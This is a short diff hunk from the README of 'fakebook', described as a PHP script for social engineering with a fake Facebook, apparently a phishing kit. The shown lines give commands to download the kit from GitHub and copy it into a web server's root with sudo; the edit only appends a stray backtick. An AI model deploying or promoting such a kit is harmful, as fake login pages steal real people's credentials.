@@ -11,7 +11,7 @@ A small php script to make social engineering with fakebook.
 cd Fakebook &&
 sudo wget https://github.com/Firologame/fakebook/archive/master.zip &&
 unzip master.zip &&
-sudo cp -R ./fakebook-master/fakebook/ /var/www/html/
+sudo cp -R ./fakebook-master/fakebook/ /var/www/html/`
 
 And then enjoy !
 
